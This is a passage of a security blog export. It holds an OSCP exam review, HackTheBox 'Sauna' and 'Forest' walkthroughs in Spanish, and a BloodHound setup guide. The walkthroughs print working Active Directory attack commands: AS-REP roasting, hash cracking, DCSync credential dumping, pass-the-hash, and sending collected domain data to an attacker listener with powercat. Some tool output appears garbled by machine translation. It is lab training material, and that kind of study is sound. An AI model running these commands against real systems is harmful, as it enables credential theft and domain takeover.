


[{"content":"","date":"16 / 04 / 2025","externalUrl":null,"permalink":"/pt-pt/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"16 / 04 / 2025","externalUrl":null,"permalink":"/pt-pt/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"16 / 04 / 2025","externalUrl":null,"permalink":"/pt-pt/tags/certification-experience/","section":"Tags","summary":"","title":"Certification Experience","type":"tags"},{"content":" I Passed the OSCP! # I can’t describe how excited and proud I am to have completed the Offensive Security Certified Professional (OSCP) certification. It’s been one of the most challenging yet rewarding experiences in my life. This certification pushed me to my limits, tested not only my technical skills but also my mindset, patience, and discipline.\nIn this post, I’ll share how I prepared for the exam, what tools and resources helped me the most, and my honest review of the whole process — from the labs to the final report.\nDeveloping the Try Harder Mentality. # One of the most important lessons I took from the OSCP is that this exam isn’t only about technical skill — it’s about mental endurance. You’ll get stuck. A lot. And that’s fine, (most of the times at least) . What matters is how you respond to it. Staying calm, thinking methodically, learning from mistakes and pushing forward even when things feel impossible is a huge part of the process.\nAnother key element is taking good notes. Without solid documentation, you’re going to waste hours repeating the same steps. Personally, I used Obsidian to organize everything — from enumeration checklists to privesc tricks and one-liners. Having my own structured notes not only helped me during the labs but was absolutely essential during the exam and for writing the final report.\nCreating a note-taking method not only helped me think more clearly and track my progress in hacking, but it also gave me better insight into how I learn and grow in general. Writing things down forced me to slow down and really understand what I was doing, instead of just rushing through steps. It helped me recognize patterns in my mistakes, refine my methodology, and approach problems more calmly.\nOver time, note-taking became more than just a study tool — it became part of how I process information and reflect on my learning, both technically and personally, as it forces you to slow down and reflect. Using Obsidian made it easier to connect ideas, revisit past concepts, and stay organized through the entire OSCP journey.\nTaking notes forces you to slow down and reflect, which is something this certification constantly requires. It helps build your methodology and gives you confidence knowing that everything you’ve learned is at your fingertips.\nOSCP Preparation: What Worked for Me? # Before I even considered going for the OSCP, I spent a lot of time on Hack The Box, solving a long list of machines to build a strong foundation. That hands-on experience helped me develop my skill set and build a solid “toolbelt” of techniques. In my opinion, experience is key, and working on CTF-style machines is essential to understand the mindset and methodology needed for certifications like the OSCP.\nAfter that, I completed the CPTS Path from HTB Academy — in my opinion, one of the best resources out there to learn ethical hacking. It builds a solid foundation starting from zero, and for the price, it’s too good. I haven’t taken the CPTS exam yet, but the course itself gave me a strong understanding of penetration testing methodology and helped reinforce many of the core concepts I later applied during my OSCP preparation.\nOnce I felt confident enough, I enrolled in the OSCP (PEN-200) course. I went through the learning modules carefully, made detailed notes, and practiced the techniques on the included labs. Having the CPTS knowledge definitly helped a lot. After that, I did the Challenge Labs, which were more advanced and really pushed me to apply everything I’d learned.\nTo wrap up my preparation, I worked on boxes from TJ Null’s OSCP-like list for Proving Grounds to simulate the exam environment. These helped me polish my workflow and improve my speed under pressure, working on a machine per day during about 2-3 months.\nExam Day: How was It? # The exam was definitely challenging, but not overwhelming — exactly what I expected after all the preparation. The hardest part of this test it is not just the technical ability, but the mental one. You need to stay focused, think logically, and keep your emotions in check.\nIn the days leading up to the exam, I made sure to stay calm and plan my approach with a clear head. Take some time to plan your meals, take rests, drink water and just stay calm! Going in with a cold, methodical mindset made a big difference — it helped me avoid panicking when things didn’t work right away (which happened several times during the test).\nTo make things even more interesting, I took the exam on an M3 MacBook, which added a few extra layers of difficulty with compatibility and setup. But it worked — and I’m proud of that too haha :)\nIt took me around 18 hours to finish both the exam and the report. I went slow and steady and relied heavily on my notes. By the end, I was mentally exhausted but proud of what I’d accomplished.\nWhat\u0026rsquo;s Next? # While working toward the OSCP, I discovered how interesting Active Directory environments can be — the complexity, the attack paths, the lateral movement… it really opened my eyes to how powerful and fun that side of hacking can be.\nThat said, I think my true passion is web hacking. I love the creativity and depth it requires, plus being able to make a huge impact with basic tools like a browser. My next steps are focused on learning more in that world to start developing myself in Bug Bounty Hunting a bit more.\nWith this said, this journey is far from over — OSCP was just the beginning. And remember: Try Harder!\n","date":"16 / 04 / 2025","externalUrl":null,"permalink":"/pt-pt/posts/oscp/","section":"Posts","summary":"In this post, I share a quick overview of my OSCP journey with you, from how I prepared the certification to the struggles that I\u0026rsquo;ve had. Take a look!","title":"I Passed the OSCP: Here’s What Worked for Me","type":"posts"},{"content":"","date":"16 / 04 / 2025","externalUrl":null,"permalink":"/pt-pt/categories/post/","section":"Categories","summary":"","title":"Post","type":"categories"},{"content":"","date":"16 / 04 / 2025","externalUrl":null,"permalink":"/pt-pt/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"16 / 04 / 2025","externalUrl":null,"permalink":"/pt-pt/","section":"S3ntinl","summary":"","title":"S3ntinl","type":"page"},{"content":"","date":"16 / 04 / 2025","externalUrl":null,"permalink":"/pt-pt/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"31 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/tags/hackthebox-machine/","section":"Tags","summary":"","title":"Hackthebox Machine","type":"tags"},{"content":" Información de la máquina Plataforma HackTheBox Sistema Operativo Windows Dificultad Fácil IP 10.10.10.175 Enumeración # Como siempre, comenzamos con Nmap:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.175 -oN ports Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 08:20 HST Nmap scan report for 10.10.10.175 Host is up (0.043s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Egotistical Bank :: Home |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-13 02:20:58Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 8h00m29s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-01-13T02:21:**05** Primero, deberíamos echar un vistazo al puerto 80 para verificar el sitio web.\nGenerar nombres de usuario desde la web # En la página about.html encontramos algunos nombres de usuario posibles, lo cual es bastante valioso en entornos Windows para probar cuentas AS-REP Roastable. Podemos guardar los nombres de usuario en un archivo de texto y con herramientas como username_generator podemos crear una lista de posibles nombres de usuario válidos.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ git clone https://github.com/shroudri/username_generator Cloning into \u0026#39;username_generator\u0026#39;... remote: Enumerating objects: 16, done. remote: Counting objects: 100% (16/16), done. remote: Compressing objects: 100% (14/14), done. Receiving objects: 100% (16/16), 6.38 KiB | 3.19 MiB/s, done. Resolving deltas: 100% (2/2), done. remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0) ┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nano users.txt ┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ python3 username_generator/username_generator.py -w users.txt fergus smith f.smith f-smith f_smith f+smith fsmith fergussmith smithfergus fergus.smith smith.fergus hugo bear h.bear h-bear h_bear h+bear hbear ¡Genial! Como ya hemos dicho, podemos intentar hacer AS-REP Roast con estos nuevos nombres de usuario. ¡Vamos a intentarlo!\nAS-REP Roasting # AS-REP Roasting es un ataque en Active Directory que explota las cuentas de usuario con la configuración “No requerir autenticación previa de Kerberos” habilitada. En un proceso de autenticación Kerberos normal, la autenticación previa impide el acceso no autorizado al exigir al cliente que encripte una marca de tiempo con el hash de la contraseña del usuario antes de solicitar la autenticación.\nSin embargo, cuando esta protección está deshabilitada, un atacante puede solicitar una AS-REP (respuesta del servicio de autenticación) para la cuenta de destino sin necesidad de credenciales válidas. El controlador de dominio responde entonces con un mensaje AS-REP cifrado que contiene un ticket de concesión de tickets (TGT), que se cifra utilizando el hash de la contraseña del usuario. Podríamos capturar esta respuesta y descifrarla sin conexión utilizando herramientas como Hashcat.\nEn este caso, podemos realizar este tipo de ataque con el script impacket GetNPUsers:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo impacket-GetNPUsers -request -usersfile mutated_users.txt -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4dcaa316dcec649688cb0371ea8277e9$64e3539a4e39c89428a623458153ba7e38f43a11ff14692160cfeb8471ccf26921ebdf5a6d6718a1f384326572845b0a86144ca9fe06b903e1c5b9d277f17b5c80dc1d9234d59f4bdf1173d8f8471cbfe7f4db197b9bd7ded4b15b85b73a138757cffbd3ff14f26bb0588702f2cc25c79c86411f613801ff2119a22e30cd7462c8abd608aa0390223d667920d57f81e0e8cbe9c1362c7d452fa6f16906c1ff351546f318838ba90baf85dd359c8a875659ab597b87b2d94bee275b5e4c997b2c660eb1500ee0cc1b7fe96578dbc4584a23ce64a58ec52f33a5fe62b0149fdf03607ac0e32423afd4b9776947eec5cfd6b3eb51340d66c47c34df3c4507158f69 ¡Genial! Parece que pudimos recuperar el TGT. El siguiente paso es intentar descifrarlo:\nDescifrando el hash # Para descifrar el hash, usaré HashCat con el modo 18200:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --mostrar $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a8bd01da689627922de7e2d6ae592cd1$7713ccb10f010cde184f5d25974bedb64b3eb853362a3b73f9bb8406522b7ad9181059 c95150045f22eedf51f83456065cfb1e8b5047936fc8ee4056c01b987477608982b208eef831d7913e4bcb0df485f2e0795f2dc92af975286f96350f2aafd6068f7ab88f4fd00805c53d61faa870 8573bb8e6669953aca2de57df74efc3f9e501abb678bb61b1ef6d95728d60b71ce9593a74e929 951eb85bbb9abe96a1d46950f20417299f7f80af4288eac5b228d5d799b0de30bfc8957dad1c4d eb416f1e70916a774aed53950d451c4e05f77630a5668f9eb7b38e7b4a36e7b9e43733dfe7b1ff019f05536bc0313fe428114020227b9ada3bdcc485ebc0e4db579:Thestrokes23 ¡Genial! Logramos obtener las credenciales. Intentemos obtener un shell como el usuario fsmith:\nIntrusión # Como el puerto 5985 está abierto, podemos intentar entrar mediante WinRM:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt; whoami egotisticalbank\\fsmith Indicador de usuario # Es hora de leer el indicador de usuario:\n*Evil-WinRM* PS C:\\Users\\FSmith\\Desktop\u0026gt; type user.txt a6395453...b505308e Privilegio Escalada # Ahora tenemos que buscar la manera de elevar los privilegios. Después de un poco de enumeración, ejecuté WinPEAS.exe, que es una herramienta bastante buena para buscar rutas de privilegios.\nEl resultado que genera este programa es bastante grande, pero hay algo que se destaca:\nÉÍÍÍÍÍÍÍÍÍÍÍ¹ Buscando credenciales de inicio de sesión automático Se encontraron algunas credenciales de inicio de sesión automático DefaultDomainName : EGOTISTICALBANK DefaultUserName : EGOTISTICALBANK\\svc_loanmanager DefaultPassword : Moneymakestheworldgoround! ¡Más credenciales! Veamos qué podemos hacer con ellas:\nBloodHound # En las máquinas de Active Directory, recomiendo ejecutar BloodHound ya que es la forma más fácil de verificar las rutas de escalada.\nComo podemos ver, el usuario svc_loanmgr tiene derecho a realizar un DCSync.\nDCSync # Un ataque DCSync es una técnica en la que un atacante abusa de los permisos de replicación en Active Directory para extraer credenciales confidenciales. Normalmente, los controladores de dominio sincronizan los datos de los usuarios entre sí mediante el Servicio de replicación de directorios (DRS). Sin embargo, si un atacante obtiene el control de una cuenta con privilegios de replicación, como un Administrador de dominio o una cuenta con el permiso Replicar todos los cambios del directorio, puede hacerse pasar por un controlador de dominio y solicitar hashes de contraseñas para cualquier usuario, incluido krbtgt.\nY esto es básicamente lo que podemos hacer con el usuario svc_loanmgr. Esta vez, podemos usar el script secretsdump de Impacket.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo impacket-secretsdump \u0026#39;EGOTISTICAL-BANK\u0026#39;/\u0026#39;svc_loanmgr\u0026#39;:\u0026#39;¡El dinero hace que el mundo gire!\u0026#39;@\u0026#39;10.10.10.175\u0026#39; Impacket v0.12.0 - Copyright Fortra, LLC y sus compañías afiliadas [-] Error en RemoteOperations: Error de tiempo de ejecución de DCERPC: código: 0x5 - rpc_s_access_denied [*] Volcado de credenciales de dominio (domain\\uid:rid:lmhash:nthash) [*] Uso del método DRSUAPI para obtener NTDS.DIT secretos Administrador:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e::: Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0 c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: BANCO EGOÍSTA.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d3 6c84fb7f5f1beab9a201db1dd::: BANCO EGOÍSTA.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: BANCO EGOÍSTA.LOCAL\\svc_loan gerente:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c::: SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:8e22e0a93dc3c341734c716a7144cc35 Con Con el ataque DCSync logramos obtener el hash NTLM del Administrador, que se puede usar con una herramienta como PSExec para hacer un inicio de sesión de tipo Pass-The-Hash:\n┌──(s3n㉿kali)-[/opt/bloodhound] └─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e Administrator@10.10.10.175 Impacket v0.12.0 - Copyright Fortra, LLC y sus empresas afiliadas Microsoft Windows [Versión 10.0.17763.973] (c) 2018 Microsoft Corporation. Todos los derechos reservados. C:\\Users\\Administrator\\Desktop\u0026gt; whoami nt authority\\system ¡Y la máquina está rooteada!\nC:\\Users\\Administrator\\Desktop\u0026gt; type root.txt 13474821...26f0e113 ","date":"31 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/posts/sauna/","section":"Posts","summary":"Sauna es una máquina Windows de dificultad fácil que cuenta con enumeración y explotación de Active Directory. Los posibles nombres de usuario se pueden derivar de los nombres completos de los empleados que figuran en el sitio web. Con estos nombres de usuario, se puede realizar un ataque ASREPRoasting. Después de la enumeración, BloodHound revela que un usuario tiene el derecho extendido \u003cem\u003eDS-Replication-Get-Changes-All\u003c/em\u003e, que permite realizar un ataque DCSync.","title":"Sauna","type":"posts"},{"content":" BloodHound # BloodHound es una herramienta poderosa y ampliamente utilizada en el campo de la ciberseguridad, particularmente para los evaluadores de penetración en entornos corporativos. Está diseñada para mapear y analizar las estructuras de Active Directory, ayudando a identificar configuraciones de seguridad incorrectas y posibles rutas de ataque que un adversario podría explotar para escalar privilegios u obtener acceso a recursos confidenciales.\nBloodHound opera mediante la recopilación y visualización de relaciones dentro de un dominio de AD. Estas relaciones incluyen membresías de grupos, permisos de usuario, relaciones de confianza y más. La fortaleza de la herramienta radica en su capacidad para descubrir cadenas complejas de privilegios que podrían ser invisibles para los administradores que auditan manualmente la seguridad de AD.\nRealizaremos una instalación rápida paso a paso de la versión comunitaria de BloodHound, así como un pequeño tutorial paso a paso sobre cómo ejecutar BloodHound y SharpHound tomando como ejemplo la máquina Forest de HackTheBox. ¡Échale un vistazo si aún no lo has hecho a mi post!\n¡Comencemos!\nInstalación # Primero, necesitamos instalar Docker:\nkali@kali:~$ sudo apt install -y docker.io kali@kali:~$ sudo systemctl enable docker --now Luego, crea el grupo docker si no existe:\nkali@kali:~$ sudo groupadd docker Añade tu usuario al grupo docker:\nkali@kali:~$ sudo usermod -aG docker $USER Ahora, instala docker-compose desde github. Además, recuerda otorgarle derechos de ejecución al binario y agregarlo al directorio /usr/bin.\nTen en cuenta la arquitectura de tu Linux a la hora de descargar Docker-Compose. Yo utilizo Kali Linux ARM, pero tu versión puede ser diferente.\nkali@kali:~$ mv ./docker-compose-linux-aarch64 docker-compose kali@kali:~$ chmod +x ./docker-compose kali@kali:~$ mv ./docker-compose /usr/bin/ Por último, necesitamos copiar el archivo docker-compose.yml de BloodHound para guardarlo localmente:\nkali@kali:~$ sudo wget https://ghst.ly/getbhce -O docker-compose.yml kali@kali:~$ docker-compose up BloodHound estará disponible en el puerto 8080.\nSharpHound # SharpHound es el componente de recopilación de datos de BloodHound. Es una herramienta de C# diseñada para recopilar información de entornos de Active Directory, que luego BloodHound utiliza para mapear y analizar rutas de ataque. SharpHound recopila datos como sesiones de usuario, membresías de grupos, listas de control de acceso (ACL) y relaciones de confianza, lo que brinda a los evaluadores de penetración y analistas de seguridad una vista detallada del entorno.\nLos datos recopilados se almacenan en archivos JSON, que luego se importan a BloodHound para visualización y análisis. Juntos, SharpHound y BloodHound son un dúo poderoso para identificar y comprender las debilidades de seguridad en los dominios de AD.\nUso de BloodHound y SharpHound # Primero, iniciemos sesión en BloodHound. Ya lo tenemos en ejecución, por lo que debemos acceder a él en http://localhost:8080.\nLa primera vez que accedamos a BloodHound, necesitaremos ingresar la contraseña generada aleatoriamente que se encuentra en la ventana de terminal donde se está ejecutando docker-compose. Luego, necesitaremos cambiarla. El usuario predeterminado es admin.\nAhora, en la pestaña Descargar recopiladores, podemos descargar la última versión de SharpHound:\nAquí, selecciona SharpHound, ¡y estamos casi listos para comenzar a recopilar datos! Solo quedan unos pocos pasos más:\nA continuación, carga el ejecutable SharpHound en la máquina Windows cuyo Active Directory deseas mapear. Desde nuestra máquina atacante, servimos SharpHound desde un servidor Python:\n┌──(s3n㉿kali)-[/opt/bloodhound/sharphound] └─$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Desde la máquina Windows, descargamos SharpHound con el siguiente comando:\nPS C:\\Users\\svc-alfresco\\Desktop\u0026gt; iwr -uri http://10.10.14.18/SharpHound.ps1 -Outfile SharpHound.ps1 Después de transferirlo a la máquina Windows, podemos importarlo a PowerShell:\nPS C:\\Users\\svc-alfresco\\Desktop\u0026gt; powershell -ep bypass PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; Import-Module .\\Sharphound.ps1 Ahora, podemos ejecutar el script para recopilar toda la información del dominio. SharpHound se basa principalmente en consultas LDAP para recopilar datos de Active Directory. Dado que las consultas LDAP son una parte estándar de la comunicación de dominio, cualquier usuario autenticado en el dominio puede ejecutarlas, por lo que SharpHound no requiere privilegios administrativos para la mayoría de sus operaciones.\nPS C:\\Users\\svc-alfresco\\Desktop\u0026gt; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\svc-alfresco\\Desktop\\ -OutputPrefix \u0026#34;forest\u0026#34; Después de la ejecución, veremos un archivo zip con toda la información. Eso es lo que necesitamos transferir de vuelta a nuestra máquina atacante. El archivo .bin que BloodHound genera es un archivo binario que se utiliza como caché para datos preprocesados. Cuando importa archivos JSON recopilados por SharpHound en BloodHound, procesa los datos y los almacena en una base de datos Neo4j.\nEl archivo .bin sirve como caché local de estos datos procesados ​​para mejorar el rendimiento, pero no necesariamente necesitamos transferirlos de vuelta a nuestra máquina, por lo que lo ignoraremos.\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; ls Directory: C:\\Users\\svc-alfresco\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/10/2025 9:29 AM 43554 forest_20250110092905_BloodHound.zip -a---- 1/10/2025 9:15 AM 1942029 SharpHound.ps1 Podemos usar nuestro método de transferencia favorito, yo usaré powercat.exe:\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; powercat -c 10.10.14.18 -p 4444 -i C:\\Users\\svc-alfresco\\Desktop\\forest_20250110092905_BloodHound.zip En nuestra máquina atacante, necesitamos abrir un receptor netcat para recibir los datos:\n┌──(s3n㉿kali)-[/opt/bloodhound] └─$ sudo nc -nlvp 4444 \u0026gt; bloodhound.zip listening on [any] 4444 ... connect to [10.10.14.18] de (DESCONOCIDO) [10.10.10.161] 50906 Una vez que tengamos el archivo zip en nuestra máquina, vamos a subirlo a BloodHound. Primero, presione la opción Administración. Importe el archivo zip en la opción Ingesta de archivos, en la sección Recopilación de datos:\nHaga clic y seleccione el archivo zip:\n¡Genial! Se subió con éxito.\nEnseñar cómo hacer consultas con BloodHound no está dentro del alcance de esta publicación, pero ejecutemos una consulta rápida \u0026ldquo;Shortest Paths to Domain Admins\u0026rdquo; para verificar si la ingesta de datos fue exitosa. ¡Funciona! Ahora tiene una instancia de BloodHound completamente funcional y en funcionamiento, lista para mapear y analizar su entorno de Active Directory.\nDetener la instancia # Detener la instancia es tan fácil como presionar Ctrl+C en la ventana de terminal donde se está ejecutando docker-compose.\nSi desea configurarlo nuevamente, simplemente ejecute docker-compose up y estará listo.\nEspero que esta guía te haya resultado útil para configurar todo sin problemas, ya que configurar un entorno de BloodHound puede ser complicado al principio. ¡Pruébalo!\n","date":"11 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/posts/bloodhound/","section":"Posts","summary":"Explicación rápida sobre cómo poner en funcionamiento BloodHound en unos minutos. Esta publicación incluye una guía de instalación paso a paso de \u003cstrong\u003eBloodHound\u003c/strong\u003e, así como la descarga de \u003cstrong\u003eSharpHound\u003c/strong\u003e y su carga en una máquina para mapear una red de Active Directory.","title":"Cómo Configurar BloodHound Community Edition","type":"posts"},{"content":" Información de la máquina Plataforma HackTheBox Sistema operativo Windows Dificultad Fácil IP 10.10.10.161 Enumeration # Como siempre, empezamos con Nmap:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p53,88,135,139,445,464,493,636,3268,3269,5985,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.161 -oN ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-08 17:29:54Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 493/tcp closed ticf-2 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-01-08T17:30:01 |_ start_date: 2025-01-08T17:19:43 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2025-01-08T09:30:03-08:00 |_clock-skew: mean: 2h46m49s, deviation: 4h37m10s, median: 6m48s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Tenemos bastantes puertos abiertos. Comencemos a explorar cada uno de ellos:\nRPC # Podemos conectarnos con una sesión nula a RPC para consultar información como usuarios del dominio:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ rpcclient -U \u0026#39;\u0026#39; -N 10.10.10.161 rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] Encontramos algunos usuarios. Es una buena práctica guardar toda la información útil que encontremos, por lo que crearé un archivo users.txt que nos ayudará en el futuro para ataques como el rociado de contraseñas.\nUn ataque de rociado de contraseñas consiste en intentar introducir una contraseña en varias cuentas de usuario dentro de una organización, en lugar de apuntar a una sola cuenta con varios intentos, evitando así los mecanismos de bloqueo.\nDespués de enumerar un poco, encuentro que el usuario svc-alfresco tiene habilitada la opción No requerir autenticación previa de Kerberos. Vamos a comprobarlo.\nAS-Rep Roasting # Un ataque AS-REP Roasting apunta a las cuentas de usuario en Active Directory que tienen habilitada la opción No requerir autenticación previa de Kerberos. Los atacantes solicitan un ticket AS-REP de Kerberos para estas cuentas, que se devuelve cifrado con el hash NTLM del usuario. Luego, podemos forzar el hash sin conexión para recuperar la contraseña en texto simple con una herramienta como hashcat.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo impacket-GetNPUsers -request -dc-ip 10.10.10.161 htb.local/ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Name MemberOf PasswordLastSet LastLogon UAC ------------ ------------------------------------------------------ -------------------------- -------------------------- -------- svc-alfresco CN=Service Accounts,OU=Security Groups,DC=htb,DC=local 2025-01-08 07:40:04.738225 2025-01-08 07:40:01.956933 0x410200 $krb5asrep$23$svc-alfresco@HTB.LOCAL:44ad01dc17d4ba761d72ea7545970dcd$7806253f36fd17dd6d9669037ace47695e502faace5fa4e2409a727613d40d083db43a8f229c3feb8968f8a48fef57d4f71f526f19d66345e6662e3563756a92e9717357312ae3c7e0d16e6fe092b09b698fbd64a5e91d9b566f1d15c3dfeaad0f1eb7e6a73d8c8ea75aaad258df47071858092fde8b9eb2c649c30fcfe30f318da1196a789d4c915e4d5e63c876d73ffaa6ff568adab010d87586ec32cc8f023a824b922b192eb0d40db2efe04dc1450e297fadfbc46f452458810d0bcffbd33933e2b1d2039332d4953ac955fb4c27c61df64c039eb88c502e0be28a47a71fadca23864fdd Vamos a crackear el hash:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show $krb5asrep$23$svc-alfresco@HTB.LOCAL:44ad01dc17d4ba761d72ea7545970dcd$7806253f36fd17dd6d9669037ace47695e502faace5fa4e2409a727613d40d083db43a8f229c3feb8968f8a48fef57d4f71f526f19d66345e6662e3563756a92e9717357312ae3c7e0d16e6fe092b09b698fbd64a5e91d9b566f1d15c3dfeaad0f1eb7e6a73d8c8ea75aaad258df47071858092fde8b9eb2c649c30fcfe30f318da1196a789d4c915e4d5e63c876d73ffaa6ff568adab010d87586ec32cc8f023a824b922b192eb0d40db2efe04dc1450e297fadfbc46f452458810d0bcffbd33933e2b1d2039332d4953ac955fb4c27c61df64c039eb88c502e0be28a47a71fadca23864fdd:s3rvice Ahora que tenemos las credenciales svc-alfresco:s3rvice, podemos intentar acceder a la máquina a través de WinRM con una herramienta como evil-winrm.\nSetting a Foothold # Podemos acceder a la máquina abusando del protocolo WinRM con evil-winrm, aprovechando las credenciales que acabamos de encontrar.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; whoami htb\\svc-alfresco ¡Genial! Estamos dentro del sistema. Ahora podemos reclamar la bandera user.\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; type user.txt 2bc3959f6...f9382ed94 Escalada de privilegios # Ahora que estamos dentro de la máquina como un usuario con pocos privilegios, queremos tomar el control de la cuenta de administrador para poder rootear el controlador de dominio.\nPodemos mapear los objetos de dominio con BloodHound. Echa un vistazo a mi publicación BloodHound donde vamos cómo hacer una instalación rápida y comenzar a usarlo, si aún no lo has hecho!\nPrimero, necesitamos recolectar la información con SharpHound, así que después de cargarla a la máquina, hacemos lo siguiente:\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; powershell -ep bypass *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; import-module ./SharpHound.ps1 *Evil-WinRM* PS 